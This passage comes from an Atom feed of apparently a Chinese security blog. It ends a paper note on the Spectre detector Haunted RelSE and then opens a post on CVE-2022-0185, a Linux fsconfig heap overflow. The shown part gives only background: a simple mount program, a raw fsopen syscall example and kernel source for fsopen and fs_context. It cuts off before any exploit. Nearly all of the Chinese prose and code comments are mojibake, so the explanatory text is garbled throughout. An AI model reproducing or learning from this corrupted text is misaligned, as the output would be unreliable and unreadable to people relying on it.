CONCLUTION</h1><p>ç ”ç©¶è€…æå‡ºäº† Haunted RelSEï¼Œä¸€ç§åŸºäºå…³ç³»ç¬¦å·æ‰§è¡Œçš„ç”¨ä»¥é™æ€æ£€æµ‹ Spectre-PHT ä¸ Spectre-STL æ¼æ´çš„æŠ€æœ¯ï¼›ç‰¹åˆ«åœ°ï¼ŒHaunted RelSE èƒ½å¤Ÿé€šè¿‡åŒæ—¶æ¨ç†å¸¸è§„æ‰§è¡Œä¸ç¬æ€æ‰§è¡Œä»¥æ˜¾è‘—åœ°å‡å°‘å¯»å€æ¨æµ‹è·¯å¾„çš„å¼€é”€ï¼›ç ”ç©¶è€…å°† Haunted RelSE åº”ç”¨äºä¸€ä¸ªå…³ç³»ç¬¦å·æ‰§è¡Œå·¥å…· <code>BINSEC/HAUNTED</code> ä¸­ï¼›æ®ç ”ç©¶è€…çš„å®éªŒç»“æœæ‰€ç¤ºï¼ŒHaunted RelSE ä¸ºè¿ˆå‘å¯æ‰©å±•çš„å¯¹ Spectre attacks çš„ä¸€æ­¥ï¼›å¯¹äº Spectre-PHTï¼ŒHaunted RelSE å¯ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹æå¤§åœ°æå‡åˆ†æé€Ÿåº¦ï¼Œåœ¨å¯¹ä¸­ç­‰å¤§å°çš„çœŸå®ä¸–ç•Œä¸­çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†ææ¨æµ‹è¯­ä¹‰å¤æ‚æ€§è¿›è¡Œå‰ªæï¼›å¯¹äº Spectre-STLï¼ŒBINSEC&#x2F;HAUNTED æ˜¯ç¬¬ä¸€ä¸ªå¯ä»¥å½»åº•åˆ†æçœŸå®ä¸–ç•Œä¸­è¾ƒå°çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶å¹¶åœ¨ä¸­ç­‰å¤§å°çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°æ¼æ´çš„å·¥å…·</p><p>æœ€åï¼Œç ”ç©¶è€…é€šè¿‡ BINSEC&#x2F;HAUNTEDï¼ŒæŠ¥å‘Šäº†ä¸€ä¸ªæ ‡å‡†çš„å¯¹ Spectre-PHT çš„é˜²æŠ¤å¯ä»¥è½»æ˜“åœ°å¼•å…¥ Spectre-STL æ¼æ´å¹¶æå‡ºäº†ä¿®å¤æ–¹æ³•ï¼Œä¸”å‘ç°äº†ä¸€ä¸ªè‘—åçš„ç”¨äºç¼–è¯‘ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶çš„ GCC ç¼–è¯‘é€‰é¡¹ä¼šå¼•å…¥ Spectre-STL</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¬¼ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="äºŒè¿›åˆ¶åˆ†æ" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spectre" scheme="http://blog.arttnba3.cn/tags/Spectre/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x09ã€‘CVE-2022-0185 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/"/>
    <id>http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/</id>
    <published>2023-01-11T04:04:19.000Z</published>
    <updated>2023-05-28T01:30:53.288Z</updated>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯ mount å¥½</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">CVE-2022-0185</a> æ˜¯ 2022 å¹´åˆçˆ†å‡ºæ¥çš„ä¸€ä¸ªä½äº filesystem context ç³»ç»Ÿä¸­çš„ <code>fsconfig</code> ç³»ç»Ÿè°ƒç”¨ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯¹äºæœ‰ç€ <code>CAP_SYS_ADMIN</code> æƒé™ï¼ˆæˆ–æ˜¯å¼€å¯äº† unprivileged namespaceï¼‰çš„æ”»å‡»è€…è€Œè¨€å…¶å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œæˆæœ¬åœ°ææƒï¼Œè¯¥æ¼æ´è·å¾—äº†é«˜è¾¾ <code>8.4</code> çš„ CVSS è¯„åˆ†</p><blockquote><p>å‘ç°æ¼æ´çš„å®‰å…¨ç ”ç©¶å‘˜çš„æŒ–æ˜ä¸åˆ©ç”¨è¿‡ç¨‹å‚è§<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">è¿™é‡Œ</a>ï¼Œæœ¬æ–‡ç¼–å†™æ—¶ä¹Ÿæœ‰ä¸€å®šå‚è€ƒ</p></blockquote><p>æœ¬æ–‡é€‰æ‹©å†…æ ¸ç‰ˆæœ¬ <code>5.4</code> è¿›è¡Œåˆ†æï¼Œåœ¨å¼€å§‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›åŸºç¡€çŸ¥è¯†</p><h2 id="Filesystem-mount-API-åˆæ¢"><a href="#Filesystem-mount-API-åˆæ¢" class="headerlink" title="Filesystem mount API åˆæ¢"></a>Filesystem mount API åˆæ¢</h2><blockquote><p>å‚è§<a href="https://zhuanlan.zhihu.com/p/93592262">çŸ¥ä¹ä¸Šçš„è¯¥ç³»åˆ—æ–‡ç« </a></p></blockquote><p>ç›¸ä¿¡å¤§å®¶å¯¹äº Linux ä¸‹çš„æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½éƒ½æ˜¯éå¸¸ç†Ÿæ‚‰â€”â€” <code>mount</code>  ç³»ç»Ÿè°ƒç”¨è¢«ç”¨ä»¥å°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ä»¥ <code>/</code> ä¸ºæ ¹èŠ‚ç‚¹çš„æ–‡ä»¶æ ‘ä¸Šï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æŒ‚è½½ç¡¬ç›˜ <code>/dev/sdb1</code> åˆ° <code>/mnt/temp</code> ç›®å½•ä¸‹ï¼Œä¹‹åå°±èƒ½åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œæ–‡ä»¶è®¿é—®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/temp</span><br></code></pre></td></tr></table></figure><p>æˆ–æ˜¯é€šè¿‡ç¼–å†™ç¨‹åºçš„æ–¹å¼ä½¿ç”¨è£¸çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨è¿›è¡ŒæŒ‚è½½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mount(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>], <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯<a href="https://lwn.net/Articles/753473/">æ€»æœ‰äº›äººæƒ³æä¸ªå¤§æ–°é—»</a>ï¼Œä»¥ AL Viro ä¸ºé¦–çš„å¼€å‘è€…è®¤ä¸ºæ—§çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨å­˜åœ¨è¯¸å¤šæ¼æ´ä¸è®¾è®¡ç¼ºé™·ï¼Œäºæ˜¯å†³å®šé‡å†™ä¸€å¥—æ–°çš„ mount APIï¼Œå¹¶<a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">æˆåŠŸè¢«åˆå¹¶åˆ°å†…æ ¸ä¸»çº¿</a>ï¼Œç§°ä¹‹ä¸º <a href="https://docs.kernel.org/filesystems/mount_api.html">Filesystem Mount API</a></p><p>æ–°çš„ mount API å°†è¿‡å»çš„ä¸€ä¸ªç®€å•çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½æ‹†åˆ†æˆäº†æ•°ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯¹åº”ä¸åŒçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½é˜¶æ®µï¼Œäºæ˜¯ä¹ç°åœ¨ Linux ä¸Šæœ‰ç€ä¸¤å¥—å¹¶è¡Œçš„ mount API</p><blockquote><p><del>ğŸ‘´çš„è¯„ä»·æ˜¯é—²ç€æ²¡äº‹å¹²å¯ä»¥å»æŠŠæ‘å£å¤§ç²ªæŒ‘ä¸€ä¸‹</del></p></blockquote><h3 id="Step-I-fsopen-è·å–ä¸€ä¸ª-filesystem-context"><a href="#Step-I-fsopen-è·å–ä¸€ä¸ª-filesystem-context" class="headerlink" title="Step.I - fsopen: è·å–ä¸€ä¸ª filesystem context"></a>Step.I - fsopen: è·å–ä¸€ä¸ª filesystem context</h3><p>è¿˜è®°å¾—ç¬”è€…ä»¥å‰è¯´è¿‡çš„ <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%80%E3%80%81%E2%80%9C%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6%E2%80%9D">Linux ä¸­ä¸€åˆ‡çš†æ–‡ä»¶</a> çš„å“²å­¦å—ï¼Œåœ¨æ–°çš„ mount API ä¸­ä¹Ÿéµå¾ªäº†è¿™æ ·çš„å“²å­¦â€”â€”å¦‚æœè¯´ <code>open()</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶æä¾›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œé‚£ä¹ˆ <strong><code>fsopen()</code> ç³»ç»Ÿè°ƒç”¨ä¾¿ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶æä¾›ä¸€ä¸ªâ€æ–‡ä»¶ç³»ç»Ÿæè¿°ç¬¦â€œ</strong>â€”â€”ç§°ä¹‹ä¸º **<code>æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</code>**ï¼ˆfilesystem contextï¼‰</p><p><img src="https://i.loli.net/2021/02/25/iUoHNsaK5vOG9cR.png" alt="wait, it&#39;s all FILES"></p><p>ç”±äºæ ‡å‡†åº“ä¸­è¿˜æœªæ·»åŠ  new mount API ç›¸å…³çš„ä»£ç ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†™ raw syscall æ¥è¿›è¡Œç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ‰“å¼€ä¸€ä¸ªç©ºç™½çš„ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ï¼ˆéœ€è¦ <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œæˆ–æ˜¯å¼€å¯äº† unprivileged namespace çš„æƒ…å†µä¸‹ä½¿ç”¨ <code>unshare()</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå¸¦æœ‰è¯¥æƒé™çš„ namespaceï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ª<strong>ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</strong>ï¼Œå¹¶æ²¡æœ‰ä¸ä»»ä½•å®é™…è®¾å¤‡æˆ–æ–‡ä»¶è¿›è¡Œå…³è”â€”â€”è¿™æ˜¯æˆ‘ä»¬éœ€è¦åœ¨æ¥ä¸‹æ¥çš„æ­¥éª¤ä¸­å®Œæˆçš„é…ç½®</p><h4 id="âœ³-fsopen-in-kernel"><a href="#âœ³-fsopen-in-kernel" class="headerlink" title="âœ³ fsopen() in kernel"></a><strong>âœ³</strong> fsopen() in kernel</h4><blockquote><p>superblockã€dentry è¿™ç±»çš„ VFS åŸºç¡€çŸ¥è¯†ä¸åœ¨æ­¤å¤„ç§‘æ™®ï¼Œè¯·è‡ªè¡Œäº†è§£ï¼šï¼‰</p></blockquote><p>åœ¨å†…æ ¸å½“ä¸­ï¼Œ<code>fsopen()</code> ç³»ç»Ÿè°ƒç”¨çš„è¡Œä¸ºå®é™…ä¸Šå¯¹åº”åˆ›å»ºçš„æ˜¯ä¸€ä¸ª <code>fs_context</code> ç»“æ„ä½“ä½œä¸º filesystem contextï¼Œåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ file ç»“æ„ä½“å¹¶åˆ†é…ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æŒ‰åç§°æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿä»¥ä¾¿äºå¯¹å…¶è¿›è¡Œè®¾ç½®ä»¥æŒ‚è½½</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬è¢«å…è®¸æŒ‡å®šåœ¨å“ªä¸ªå®¹å™¨ä¸­æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿï¼Œç”±æ­¤æŒ‡ç¤ºè¦ä½¿ç”¨å“ªä¸€ä¸ªå‘½åç©ºé—´</span><br><span class="hljs-comment"> * (å°¤å…¶æ˜¯å°†å“ªä¸ªç½‘ç»œå‘½åç©ºé—´ç”¨äºç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><span class="hljs-comment">//æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><span class="hljs-comment">//æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">// capabilities æœºåˆ¶ï¼Œæ£€æŸ¥å¯¹åº”ã€å‘½åç©ºé—´ã€‘æ˜¯å¦æœ‰ CAP_SYS_ADMIN æƒé™</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">// æ‹·è´ç”¨æˆ·ä¼ å…¥çš„æ–‡ä»¶ç³»ç»Ÿå</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><br><span class="hljs-comment">// æŒ‰åç§°è·å–æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ç»“æ„ä½“</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br><span class="hljs-comment">// åˆ†é… Logging buffer</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><br><span class="hljs-comment">// åˆ›å»º file ç»“æ„ä½“å¹¶åˆ†é…æ–‡ä»¶æè¿°ç¬¦</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>fs_context</code> çš„å…·ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”¨ä»¥ä¿å­˜åœ¨åˆ›å»ºä¸é‡æ–°é…ç½®ä¸€ä¸ª superblock ä¸­çš„å‚æ•°çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock çš„åˆ›å»ºä¼šå¡«å……åˆ° -&gt;root ä¸­ï¼Œé‡æ–°é…ç½®éœ€è¦è¯¥å­—æ®µå·²ç»è®¾ç½®.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å‚è§ Documentation/filesystems/mount_api.txt</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">uapi_mutex</span>;</span><span class="hljs-comment">/* ç”¨æˆ·ç©ºé—´è®¿é—®çš„äº’æ–¥é” */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>*<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-type">void</span>*fs_private;<span class="hljs-comment">/* æ–‡ä»¶ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡ */</span><br><span class="hljs-type">void</span>*sget_key;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>*<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* root ä¸ superblock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">user_ns</span>;</span><span class="hljs-comment">/* å°†è¦æŒ‚è½½çš„ç”¨æˆ·å‘½åç©ºé—´ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>*<span class="hljs-title">net_ns</span>;</span><span class="hljs-comment">/* å°†è¦æŒ‚è½½çš„ç½‘ç»œ1å‘½åç©ºé—´ */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>*<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* æŒ‚è½½è€…çš„ credentials */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>*<span class="hljs-title">log</span>;</span><span class="hljs-comment">/* Logging buffer */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*source;<span class="hljs-comment">/* æº (eg. è®¾å¤‡è·¯å¾„) */</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* Linux S&amp;M è®¾ç½® */</span><br><span class="hljs-type">void</span>*s_fs_info;<span class="hljs-comment">/* Proposed s_fs_info */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags;<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags_mask;<span class="hljs-comment">/* Superblock flags that were changed */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>s_iflags;<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>lsm_flags;<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span><span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span><span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* The phase the context is in */</span><br><span class="hljs-type">bool</span>need_free:<span class="hljs-number">1</span>;<span class="hljs-comment">/* éœ€è¦è°ƒç”¨ ops-&gt;free() */</span><br><span class="hljs-type">bool</span>global:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>fs_context</code> çš„åˆå§‹åŒ–åœ¨ <code>alloc_fs_context()</code> ä¸­å®Œæˆï¼Œåœ¨ <code>fsopen()</code> ä¸­å¯¹åº”çš„æ˜¯ <code>FS_CONTEXT_FOR_MOUNT</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 